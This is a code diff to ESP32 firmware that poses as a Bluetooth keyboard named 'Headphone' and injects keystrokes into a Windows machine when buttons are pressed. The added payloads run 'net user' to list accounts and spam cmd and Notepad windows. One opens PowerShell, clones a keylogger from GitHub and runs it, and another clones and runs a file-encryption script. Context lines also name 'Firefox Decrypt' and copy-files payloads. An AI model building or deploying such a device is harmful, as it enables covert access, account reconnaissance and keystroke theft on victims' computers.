@@ -9,6 +9,12 @@
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Virus & Threat Protection)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: Firefox Decrypt)
 #define BUTTON_9_PIN 26 // Button 9 (Trigger: Copy Files Payload)
+#define BUTTON_10_PIN 27 // Button 10 (Trigger: Notepad Message + Save)
+#define BUTTON_11_PIN 32 // Button 11 (Trigger: Net User Command)
+#define BUTTON_12_PIN 33 // Button 12 (Trigger: Open 5 Notepads)
+#define BUTTON_13_PIN 14 // Button 13 (Trigger: Open 5 CMDs)
+#define BUTTON_14_PIN 12 // Button 14 (Trigger: Keylogger)
+#define BUTTON_15_PIN 13 // Button 15 (Trigger: File Encryption Demo)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -22,6 +28,12 @@ bool lastState6 = HIGH;
 bool lastState7 = HIGH;
 bool lastState8 = HIGH;
 bool lastState9 = HIGH;
+bool lastState10 = HIGH;
+bool lastState11 = HIGH;
+bool lastState12 = HIGH;
+bool lastState13 = HIGH;
+bool lastState14 = HIGH;
+bool lastState15 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -40,7 +52,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 9 Triggers on Buttons 1-9 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 26)...");
+  Serial.println("Starting BLE HID setup with 15 Triggers on Buttons 1-15 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 26, 27, 32, 33, 14, 12, 13)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -51,6 +63,12 @@ void setup() {
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
   pinMode(BUTTON_9_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_11_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_15_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -69,6 +87,12 @@ void loop() {
     bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
     bool state9 = digitalRead(BUTTON_9_PIN);
+    bool state10 = digitalRead(BUTTON_10_PIN);
+    bool state11 = digitalRead(BUTTON_11_PIN);
+    bool state12 = digitalRead(BUTTON_12_PIN);
+    bool state13 = digitalRead(BUTTON_13_PIN);
+    bool state14 = digitalRead(BUTTON_14_PIN);
+    bool state15 = digitalRead(BUTTON_15_PIN);
 
     // Button 1: Rickroll (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -222,6 +246,104 @@ void loop() {
       Serial.println("Copy Files Payload executed");
     }
 
+    // Button 10: Notepad Message + Save (Pin 27)
+    if (lastState10 == HIGH && state10 == LOW) {
+      Serial.println("Button 10: Notepad Message + Save (Pin 27)");
+      openRun(); delay(1000); 
+      sendString("notepad", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("Hello! This is automated typing using BLE HID.", 10); delay(500);
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('f'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(100);
+      bleKeyboard.press('x'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(500);
+      Serial.println("Notepad Message + Save executed");
+    }
+
+    // Button 11: Net User Command (Pin 32)
+    if (lastState11 == HIGH && state11 == LOW) {
+      Serial.println("Button 11: Net User Command (Pin 32)");
+      openRun(); delay(1000); 
+      sendString("cmd", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1500);
+      sendString("net user", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(5000);
+      sendString("exit", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(500);
+      Serial.println("Net User Command executed");
+    }
+
+    // Button 12: Open 5 Notepads (Pin 33)
+    if (lastState12 == HIGH && state12 == LOW) {
+      Serial.println("Button 12: Open 5 Notepads (Pin 33)");
+      for (int i = 0; i < 5; i++) {
+        openRun(); delay(1000); 
+        sendString("notepad", 10); delay(100); 
+        bleKeyboard.press(KEY_RETURN); delay(100); 
+        bleKeyboard.releaseAll(); delay(1000);
+      }
+      Serial.println("Open 5 Notepads executed");
+    }
+
+    // Button 13: Open 5 CMDs (Pin 14)
+    if (lastState13 == HIGH && state13 == LOW) {
+      Serial.println("Button 13: Open 5 CMDs (Pin 14)");
+      for (int i = 0; i < 5; i++) {
+        openRun(); delay(1000); 
+        sendString("cmd", 10); delay(100); 
+        bleKeyboard.press(KEY_RETURN); delay(100); 
+        bleKeyboard.releaseAll(); delay(1000);
+      }
+      Serial.println("Open 5 CMDs executed");
+    }
+
+    // Button 14: Keylogger (Pin 12)
+    if (lastState14 == HIGH && state14 == LOW) {
+      Serial.println("Button 14: Keylogger (Pin 12)");
+      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("powershell", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd Keylogger", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000);
+      sendString("python keylogger.py", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000);
+      Serial.println("Keylogger Payload executed");
+    }
+
+    // Button 15: File Encryption Demo (Pin 13)
+    if (lastState15 == HIGH && state15 == LOW) {
+      Serial.println("Button 15: File Encryption Demo (Pin 13)");
+      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("powershell", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000);
+      sendString("python code.py", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000);
+      Serial.println("File Encryption Demo Payload executed");
+    }
+
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -231,6 +353,12 @@ void loop() {
     lastState7 = state7;
     lastState8 = state8;
     lastState9 = state9;
+    lastState10 = state10;
+    lastState11 = state11;
+    lastState12 = state12;
+    lastState13 = state13;
+    lastState14 = state14;
+    lastState15 = state15;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
